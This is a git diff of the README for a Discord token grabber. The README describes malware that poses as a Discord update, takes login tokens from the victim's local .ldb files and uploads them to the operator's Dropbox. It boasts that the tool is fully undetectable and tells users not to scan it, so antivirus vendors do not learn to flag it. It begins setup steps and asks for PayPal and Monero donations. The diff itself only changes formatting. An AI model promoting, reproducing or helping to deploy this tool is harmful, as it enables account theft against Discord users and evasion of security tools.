@@ -3,9 +3,8 @@ This Discord token grabber is able to get and upload any token from the .ldb and
 
 The program looks like a Discord Update, but it actually gets the tokens from the victim's discord app and uploads it to the given Dropbox account.
 
-```sh
+
 **Currently 100% FUD (no virus detecton) so DO NOT UPLOAD IT TO VIRUSTOTAL AND DO NOT SCAN IT WITH YOUR ANTIVIRUS, BECAUSE LATER IT WILL BE ANALYZED AND IT WILL NO LONGER BE FUD!!!**
-```
 
 ## Steps:
  - Get a Dropbox account
@@ -19,7 +18,7 @@ The program looks like a Discord Update, but it actually gets the tokens from th
  - [NYAN CAT](https://github.com/NYAN-x-CAT/Discord-Token-Grabber) +rep 🍺
  - iLinked +rep 🍺 (R.I.P. GitHub profile 😢)
 
-## Buy me a coffee:
+## Buy me a coffee ☕:
 **[PayPal](paypal.me/iklevi)**
 
 **Monero address** `44zh2iQsZcc8knbgwDPhRzKHmX6fgAq8kHz84qoCYv4v6qaRjVWcUmhFfjc8dhkYQw9whdecg3wtALe8ScJr5Ck4Hut4HNe`
